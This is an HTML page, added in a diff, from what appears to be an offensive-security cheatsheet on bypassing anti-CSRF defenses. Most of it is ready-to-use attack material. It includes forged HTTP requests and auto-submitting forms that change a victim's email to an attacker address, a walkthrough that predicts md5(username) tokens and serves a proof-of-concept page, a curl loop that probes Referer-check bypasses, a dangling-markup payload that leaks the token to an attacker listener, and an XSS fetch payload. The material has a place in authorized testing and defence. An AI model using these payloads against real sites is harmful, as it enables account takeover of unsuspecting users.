@@ -1,0 +1,416 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CSRF Token Bypass · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Sessions</nav><h1>CSRF Token Bypass</h1><p class="cx-lede">Defeating anti-CSRF defenses - weak token generation analysis (md5(username) and similar), null/blank/random token tricks, cross-account token reuse, Referer regex weakness, method tampering, double-submit cookie abuse via session fixation, and SameSite bypasses via subdomains.</p><div class="cx-tags"><span class="cx-tag">MITRE T1212, T1185</span><span class="cx-tag">D3FEND D3-IAA</span><span class="cx-tag">IMPACT SessionTakeover, AccountTakeover</span><span class="cx-tag">OWASP A01, A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Anti-CSRF defenses exist to block CSRF, but a depressing fraction are buggy enough that the operator can route around them. The bypass categories, in order of how often they work:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Delete the token parameter entirely (app only checks &quot;if present, validate&quot;)
+# 2. Send a blank/null token value
+# 3. Match the length but randomize the content (app only checks length)
+# 4. Reuse a token from your own account (app validates format, not user-binding)
+# 5. Method-tamper POST→GET (anti-CSRF only on POST)
+# 6. Reverse-engineer the token formula (md5(username), sha1(date+user), etc.)
+# 7. Bypass Referer regex (target.com matches target.com.evil.com)
+# 8. Same-site exploitation when SameSite=Lax/None (subdomain XSS, etc.)
+# 9. Session-fixation + double-submit cookie (fix the cookie, control the body)</code></pre></figure>
+<p>Success indicator: a state-changing request that the target accepts despite either missing, fake, or wrong-context anti-CSRF data.</p>
+<h2 id="the-defenses-and-why-each-is-fragile">The defenses, and why each is fragile</h2>
+<table>
+<thead>
+<tr>
+<th>Defense</th>
+<th>What goes wrong</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Per-session token</td>
+<td>Validation might be "if token present, check; otherwise allow"</td>
+</tr>
+<tr>
+<td>Per-request token</td>
+<td>Same as per-session; or weak rotation lets stale tokens stay valid</td>
+</tr>
+<tr>
+<td>Double-submit cookie</td>
+<td>Cookie-fixation lets attacker control both halves</td>
+</tr>
+<tr>
+<td>Origin/Referer check</td>
+<td>Regex weakness, missing-header fallback, subdomain confusion</td>
+</tr>
+<tr>
+<td>Custom header requirement</td>
+<td>Some APIs are inconsistent about which endpoints enforce it</td>
+</tr>
+<tr>
+<td>SameSite cookies</td>
+<td>Subdomain XSS bypasses; cross-origin same-site relations</td>
+</tr>
+<tr>
+<td>Encrypted/HMAC token</td>
+<td>Replay attacks if token isn't bound to nonce/timestamp</td>
+</tr>
+</tbody>
+</table>
+<p>The recurring theme: a defense is only as strong as its weakest validation path. Apps with multiple entry points to the same action (web form, JSON API, GraphQL mutation, legacy endpoint) often defend one path and forget another.</p>
+<h2 id="category-1-delete-the-token-parameter">Category 1 - Delete the token parameter</h2>
+<p>The simplest bypass. Some apps' validation logic:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>if (request.has_parameter(&#x27;csrf_token&#x27;)):
+    if not valid(request.csrf_token):
+        reject()
+# (no else branch - request without csrf_token at all passes through)</code></pre></figure>
+<p>The mistake is checking the token "if present" rather than always requiring it. Send the request without the token at all:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /api/change-email HTTP/1.1
+Host: target.com
+Cookie: auth-session=...
+Content-Type: application/x-www-form-urlencoded
+
+email=attacker@evil.com</code></pre></figure>
+<p>No <code>csrf_token</code> parameter. App accepts.</p>
+<p>Equivalent in form CSRF:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;form action=&quot;http://target/api/change-email&quot; method=&quot;POST&quot;&gt;
+  &lt;input name=&quot;email&quot; value=&quot;attacker@evil.com&quot;&gt;
+  &lt;!-- intentionally no csrf token field --&gt;
+&lt;/form&gt;</code></pre></figure>
+<p>Always try this first.</p>
+<h3 id="variant-empty-value">Variant: empty value</h3>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /api/change-email HTTP/1.1
+Cookie: auth-session=...
+
+email=attacker@evil.com&amp;csrf_token=</code></pre></figure>
+<p>Empty string. Some apps check "is the field present" but treat empty as "skip validation."</p>
+<h3 id="variant-parameter-pollution">Variant: parameter pollution</h3>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /api/change-email HTTP/1.1
+Cookie: auth-session=...
+
+email=attacker@evil.com&amp;csrf_token=BAD&amp;csrf_token=&amp;csrf_token=</code></pre></figure>
+<p>Multiple values for the same parameter. Some frameworks pick the first, some the last. If validation picks the first (<code>BAD</code>, rejected) but the action uses the last (empty, OK) - or vice versa - that's the bypass.</p>
+<h2 id="category-2-wrong-length-wrong-format-token">Category 2 - Wrong-length / wrong-format token</h2>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /api/change-email
+Cookie: auth-session=...
+
+email=attacker@evil.com&amp;csrf_token=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre></figure>
+<p>Same length as a real token (32 hex chars), random content. Apps that only check <code>len(token) == 32</code> accept this.</p>
+<p>Variants:</p>
+<ul>
+<li>All-zero token: <code>csrf_token=00000000000000000000000000000000</code></li>
+<li>Reused-character: <code>csrf_token=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></li>
+<li>Same prefix as your real token, junk suffix: <code>csrf_token=YOUR_REAL_PREFIX_THEN_GARBAGE_PADDING</code></li>
+</ul>
+<h2 id="category-3-cross-account-token">Category 3 - Cross-account token</h2>
+<p>Register two accounts. Log in as account A, capture the CSRF token. Log into account B in a different browser. From the CSRF PoC, target account B's session but use account A's token.</p>
+<p>Some apps validate "is this a valid CSRF token shape" without checking "is this <em>this user's</em> CSRF token."</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;form action=&quot;http://target/api/change-email&quot; method=&quot;POST&quot;&gt;
+  &lt;input name=&quot;email&quot; value=&quot;attacker@evil.com&quot;&gt;
+  &lt;!-- This is YOUR token from your own session --&gt;
+  &lt;input name=&quot;csrf_token&quot; value=&quot;my_own_session_token_value&quot;&gt;
+&lt;/form&gt;</code></pre></figure>
+<p>Send to the victim. Victim's cookie + your token. App checks "token has the right format/signature/HMAC" and accepts because it does - but the cookie belongs to the victim, so the action happens on the victim's account.</p>
+<p>This is a common finding because per-user binding is an extra implementation step that's easy to skip.</p>
+<h2 id="category-4-predictable-token">Category 4 - Predictable token</h2>
+<p>Some apps generate tokens deterministically. Common patterns to check:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Patterns where TOKEN should equal the function output
+echo -n &#x27;username&#x27; | md5sum                    # md5(username)
+echo -n &#x27;username&#x27; | sha1sum                   # sha1(username)
+echo -n &quot;$(date +%Y-%m-%d)$USERNAME&quot; | md5sum  # md5(date + username)
+echo -n &quot;$USERNAME$SALT&quot; | sha256sum           # sha256(username + known salt)
+
+# JWT decoded - sometimes the &quot;csrf&quot; claim is just base64(username)
+echo -n &#x27;admin&#x27; | base64</code></pre></figure>
+<p>To check: register an account, capture your CSRF token, try the various formulas with your username. If any match, that's the algorithm. Now generate tokens for the victim:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ echo -n &#x27;victim_username&#x27; | md5sum
+ec23c4e6e07ba43e0ad8d0eb24e6e6f9  -</code></pre></figure>
+<p>Use that value as the CSRF token in your PoC. Validates correctly because the formula matches.</p>
+<h3 id="variants-and-their-detection">Variants and their detection</h3>
+<table>
+<thead>
+<tr>
+<th>Algorithm</th>
+<th>Detection</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>md5(username)</code></td>
+<td>32 hex chars; matches <code>echo -n USER \| md5sum</code></td>
+</tr>
+<tr>
+<td><code>sha1(username)</code></td>
+<td>40 hex chars; matches <code>echo -n USER \| sha1sum</code></td>
+</tr>
+<tr>
+<td><code>sha256(username)</code></td>
+<td>64 hex chars; matches <code>echo -n USER \| sha256sum</code></td>
+</tr>
+<tr>
+<td><code>base64(username)</code></td>
+<td>Variable length; ends with padding <code>=</code> or <code>==</code></td>
+</tr>
+<tr>
+<td><code>base64(username + secret)</code></td>
+<td>Decode → see if first N chars match username</td>
+</tr>
+<tr>
+<td><code>hex(timestamp)</code></td>
+<td>All-hex token where decode-as-int looks like Unix epoch</td>
+</tr>
+<tr>
+<td>HMAC of session ID</td>
+<td>Token is fixed but rotates when session changes</td>
+</tr>
+<tr>
+<td><code>random</code></td>
+<td>No pattern; varies between requests; can't predict</td>
+</tr>
+</tbody>
+</table>
+<h3 id="what-to-try">What to try</h3>
+<p>Always test:</p>
+<ol>
+<li><code>md5(username)</code> - most common naive choice</li>
+<li><code>sha1(username)</code> - second most common</li>
+<li><code>sha256(username)</code> - modern but still naive</li>
+<li><code>md5(username + "salt")</code> - try common salt strings like the app's name or domain</li>
+<li><code>base64(username)</code> - sometimes used by lazy implementations</li>
+</ol>
+<p>If none match, the algorithm is probably random or HMAC-based - bypass via this path won't work.</p>
+<h2 id="category-5-method-tampering">Category 5 - Method tampering</h2>
+<p>When the anti-CSRF check is implemented only for POST requests:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python"># Vulnerable controller pattern
+@app.route(&#x27;/api/change-email&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])
+def change_email():
+    if request.method == &#x27;POST&#x27;:
+        if not valid_csrf(request.form[&#x27;csrf_token&#x27;]):
+            abort(403)
+    # Both POST and GET reach this - but only POST checks CSRF
+    new_email = request.values[&#x27;email&#x27;]
+    update_user_email(current_user, new_email)
+    return &#x27;OK&#x27;</code></pre></figure>
+<p>Send the request as GET:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;img src=&quot;http://target/api/change-email?email=attacker@evil.com&quot;&gt;</code></pre></figure>
+<p>App routes the GET request, skips the CSRF check (because the check is wrapped in <code>if request.method == 'POST':</code>), and processes the action.</p>
+<p>Always try the alternate method when CSRF is in place. Convert POST→GET by moving params to query string; convert GET→POST by submitting the form with method POST.</p>
+<h3 id="header-method-override">Header method override</h3>
+<p>Some apps respect <code>X-HTTP-Method-Override</code> header for legacy reasons:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;form action=&quot;http://target/api/change-email?_method=POST&quot; method=&quot;GET&quot;&gt;
+  &lt;input name=&quot;email&quot; value=&quot;attacker@evil.com&quot;&gt;
+&lt;/form&gt;</code></pre></figure>
+<p>Or:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">GET /api/change-email?email=attacker@evil.com HTTP/1.1
+X-HTTP-Method-Override: POST</code></pre></figure>
+<p>The app sees a GET (skips CSRF check) and then routes as POST (does the action). Some Rails / Spring / Symfony apps have this enabled by default.</p>
+<h2 id="category-6-referer-origin-bypasses">Category 6 - Referer / Origin bypasses</h2>
+<p>When the app validates <code>Referer</code> or <code>Origin</code> header instead of (or in addition to) a token:</p>
+<h3 id="missing-header-fallback">Missing-header fallback</h3>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /api/change-email
+Cookie: auth-session=...
+
+email=attacker@evil.com</code></pre></figure>
+<p>No <code>Referer:</code> or <code>Origin:</code> at all. Apps that "allow if missing" fail open.</p>
+<p>To strip these headers from your PoC:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!-- Meta tag tells browser not to send Referer --&gt;
+&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;
+&lt;form ...&gt;...&lt;/form&gt;</code></pre></figure>
+<p>Or <code>&lt;a rel="noreferrer"&gt;</code> for link-based triggers. The <code>Origin</code> header is harder to strip on a normal form POST but <code>&lt;form&gt;</code> POSTs <em>don't</em> set Origin in some browsers historically (modern browsers do set it).</p>
+<h3 id="regex-weakness">Regex weakness</h3>
+<p>Apps that match Referer/Origin against a regex sometimes get the regex wrong:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python"># Bad: matches anywhere in the string
+if re.search(r&#x27;target\.com&#x27;, request.headers.get(&#x27;Referer&#x27;, &#x27;&#x27;)):
+    pass_csrf_check()
+
+# Attacker&#x27;s Referer:
+# https://target.com.evil.com/csrf-page.html      ← matches &quot;target.com&quot;
+# https://evil.com/?target.com                    ← matches &quot;target.com&quot;
+# https://evil-target.com.evil.com/               ← matches &quot;target.com&quot;</code></pre></figure>
+<p>Patterns to try when the regex is suspected:</p>
+<ul>
+<li><code>https://YOUR_ATTACKER_DOMAIN_CONTAINING_TARGET.COM_AS_SUBSTRING/</code></li>
+<li><code>https://attacker.com/path?fake=target.com</code></li>
+<li><code>https://target.com.attacker.com/</code></li>
+<li><code>https://attackertarget.com/</code></li>
+</ul>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Test if any Referer matches
+for ref in \
+  &#x27;https://target.com.evil.com/&#x27; \
+  &#x27;https://evil.com/target.com&#x27; \
+  &#x27;https://eviltarget.com/&#x27; \
+  &#x27;https://target.com@evil.com/&#x27;; do
+  echo -n &quot;$ref → &quot;
+  curl -s -o /dev/null -w &#x27;%{http_code}\n&#x27; \
+       -e &quot;$ref&quot; \
+       -X POST -d &#x27;email=attacker@evil.com&#x27; \
+       -b &#x27;auth-session=...&#x27; \
+       http://target/api/change-email
+done</code></pre></figure>
+<p>The response code tells you which Referer values are accepted.</p>
+<h3 id="url-component-confusion">URL-component confusion</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>https://attacker.com/redirect?to=target.com</code></pre></figure>
+<p>If the regex naively splits on <code>://</code>, the path component contains <code>target.com</code> and matches. Real Origin would be <code>https://attacker.com</code> but the implementer parsed Referer instead of Origin and got the parsing wrong.</p>
+<h2 id="category-7-same-site-exploitation">Category 7 - Same-site exploitation</h2>
+<p>When <code>SameSite=Lax</code> or <code>Strict</code> is in place, classic cross-origin CSRF dies. But "same site" is different from "same origin":</p>
+<table>
+<thead>
+<tr>
+<th>Pair</th>
+<th>Same-origin?</th>
+<th>Same-site?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>app.target.com</code> &amp; <code>evil.com</code></td>
+<td>No</td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>app.target.com</code> &amp; <code>blog.target.com</code></td>
+<td>No</td>
+<td><strong>Yes</strong></td>
+</tr>
+<tr>
+<td><code>target.com</code> &amp; <code>target.com:8080</code></td>
+<td>No</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>target.com</code> &amp; <code>target.com.au</code></td>
+<td>No</td>
+<td>No</td>
+</tr>
+</tbody>
+</table>
+<p>If you can inject HTML on <code>blog.target.com</code> (open blog comment field, user-controlled content), it can issue requests to <code>app.target.com</code> with cookies attached - because they're same-site, SameSite=Lax/Strict cookies are sent.</p>
+<h3 id="subdomain-takeover-samesite-bypass">Subdomain takeover → SameSite bypass</h3>
+<p>Find an abandoned subdomain pointing to a service you can claim (S3 bucket no longer registered, Heroku app deleted, Azure CNAME dangling). Register the service, control the subdomain, plant your CSRF page there.</p>
+<p>Now <code>your-claimed-subdomain.target.com/csrf.html</code> is same-site with <code>app.target.com</code>. Cookies flow. CSRF works.</p>
+<p>This requires reconnaissance - subdomain enumeration, scan for dangling DNS records. See <a href="../../../network/recon/domains-and-subdomains/index.html">domains and subdomains recon</a> for the techniques.</p>
+<h2 id="category-8-double-submit-cookie-with-fixation">Category 8 - Double-submit cookie with fixation</h2>
+<p>The double-submit-cookie defense: server sends a random token both as a cookie <em>and</em> embeds it in form fields; server checks the two match. Stateless - no server-side storage.</p>
+<p>The mistake: the server doesn't actually verify the token came from this session. Anything that sets matching cookie + body values passes.</p>
+<p>Attack chain when session fixation is also present:</p>
+<ol>
+<li>Attacker visits target, captures the CSRF cookie value (e.g., <code>csrf_cookie=XYZ123</code>)</li>
+<li>Attacker crafts a CSRF page that submits <code>csrf_token=XYZ123</code> in the body</li>
+<li>Attacker also injects <code>Set-Cookie: csrf_cookie=XYZ123</code> onto the victim (via cookie injection - subdomain, response-splitting, or a related vulnerability)</li>
+<li>Victim visits the CSRF page → request goes out with <code>csrf_cookie=XYZ123</code> (injected) + <code>csrf_token=XYZ123</code> (in body); server checks they match; they do; action executes</li>
+</ol>
+<p>The defense is broken because the server trusts that "matching cookie + body means same user agent that received them," which isn't true if the attacker can inject cookies.</p>
+<h2 id="category-9-token-leak-via-other-vulnerabilities">Category 9 - Token-leak via other vulnerabilities</h2>
+<p>When you can't bypass the token check, leak the token:</p>
+<h3 id="html-injection">HTML injection</h3>
+<p>If the target has HTML injection (e.g., reflects user input into a page rendered to other users), inject a tag that pulls content following the injection point:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!-- Injection point in a page that also contains the CSRF token in the HTML --&gt;
+&lt;table background=&#x27;//attacker:8000/</code></pre></figure>
+<p>If the injection is reflected before the CSRF token's <code>&lt;input&gt;</code> tag, this opens a string that won't close until the next <code>'</code>. The browser tries to fetch the constructed URL, which includes everything between your injection and the next single-quote - <em>including the CSRF token value</em>.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>GET //attacker:8000/&lt;HTML content including token&gt;</code></pre></figure>
+<p>Your listener receives the request. The URL path contains the leaked CSRF token.</p>
+<p>This pattern requires the injection to land in a context where it can break out into HTML attribute syntax. View source to confirm the injection point and what follows.</p>
+<h3 id="xss">XSS</h3>
+<p>If XSS works on the target (which is by definition same-origin), JavaScript reads the token directly:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">const token = document.querySelector(&#x27;input[name=&quot;csrf_token&quot;]&#x27;).value;
+fetch(&#x27;/api/change-email&#x27;, {
+  method: &#x27;POST&#x27;,
+  headers: {&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;},
+  body: `email=attacker@evil.com&amp;csrf_token=${token}`,
+});</code></pre></figure>
+<p>This is the canonical <a href="../xss-csrf-chain/index.html">XSS + CSRF chain</a> - XSS reads the token <em>and</em> makes the request, defeating both anti-CSRF and SameSite.</p>
+<h2 id="a-worked-weak-token-bypass">A worked weak-token bypass</h2>
+<p>The typical scenario: app generates CSRF tokens as <code>md5(username)</code>. Operator owns account <code>attacker</code>, victim is <code>victim</code>.</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># 1. Confirm the formula on attacker&#x27;s own account
+$ echo -n &#x27;attacker&#x27; | md5sum
+3edbe7bf83fec3a16edb7fbc4d39a2fb  -
+
+# (Compare with the CSRF token visible in attacker&#x27;s account forms)
+# If it matches: formula confirmed.
+
+# 2. Compute the token for victim
+$ echo -n &#x27;victim&#x27; | md5sum
+b7fb3eb1f9b8b18b4f7c2c7f8e2c1d2a  -
+
+# 3. Craft CSRF PoC using victim&#x27;s predicted token
+cat &gt; poc.html &lt;&lt;&#x27;EOF&#x27;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;&lt;body onload=&quot;document.f.submit()&quot;&gt;
+&lt;form name=&quot;f&quot; action=&quot;http://target/api/change-email&quot; method=&quot;POST&quot;&gt;
+  &lt;input name=&quot;email&quot; value=&quot;csrf-poc@evil.com&quot;&gt;
+  &lt;input name=&quot;csrf_token&quot; value=&quot;b7fb3eb1f9b8b18b4f7c2c7f8e2c1d2a&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;&lt;/html&gt;
+EOF
+
+# 4. Serve and deliver
+python3 -m http.server 1337
+# Send http://your-ip:1337/poc.html to victim</code></pre></figure>
+<p>Victim logs in (their cookie sets), visits the PoC, form submits with their cookie + predicted token, app accepts.</p>
+<p>Note: the predicted-token CSRF defeats the <em>server-side check</em> but doesn't defeat SameSite cookies. If the cookie is SameSite=Strict, the cookie isn't sent on the form submission and the request fails for a different reason. Predicted-token CSRF works best when SameSite is None or absent.</p>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Bypass</th>
+<th>Try</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Delete token</td>
+<td>Send request without the csrf field</td>
+</tr>
+<tr>
+<td>Blank token</td>
+<td><code>csrf_token=</code> (empty)</td>
+</tr>
+<tr>
+<td>Random same-length</td>
+<td><code>csrf_token=AAAA...AAAA</code> (matched length)</td>
+</tr>
+<tr>
+<td>Cross-account</td>
+<td>Use your own account's token in PoC targeting victim</td>
+</tr>
+<tr>
+<td>Method tampering</td>
+<td>POST→GET or GET→POST; add <code>X-HTTP-Method-Override</code></td>
+</tr>
+<tr>
+<td>Strip Referer</td>
+<td><code>&lt;meta name="referrer" content="no-referrer"&gt;</code></td>
+</tr>
+<tr>
+<td>Confuse Referer regex</td>
+<td><code>https://target.com.evil.com/</code>; <code>https://evil.com/?target.com</code></td>
+</tr>
+<tr>
+<td>Weak token (md5)</td>
+<td><code>echo -n USER \| md5sum</code> vs token value</td>
+</tr>
+<tr>
+<td>Weak token (sha1)</td>
+<td><code>echo -n USER \| sha1sum</code></td>
+</tr>
+<tr>
+<td>Token leak via HTML inj</td>
+<td><code>&lt;table background='//attacker:8000/</code></td>
+</tr>
+<tr>
+<td>Token leak via XSS</td>
+<td><code>document.querySelector('input[name=csrf_token]').value</code></td>
+</tr>
+<tr>
+<td>SameSite same-site</td>
+<td>Find injectable HTML on a sibling subdomain</td>
+</tr>
+<tr>
+<td>Double-submit + fixation</td>
+<td>Inject CSRF cookie, body, both match - passes check</td>
+</tr>
+<tr>
+<td><code>enctype="text/plain"</code> JSON</td>
+<td>See <a href="../csrf/index.html">CSRF</a> - text/plain form trick</td>
+</tr>
+</tbody>
+</table></article><nav class="cx-pager"><a class="cx-prev" href="../csrf/index.html">Previous: CSRF</a><a class="cx-next" href="../xss-csrf-chain/index.html">Next: XSS + CSRF Chain</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
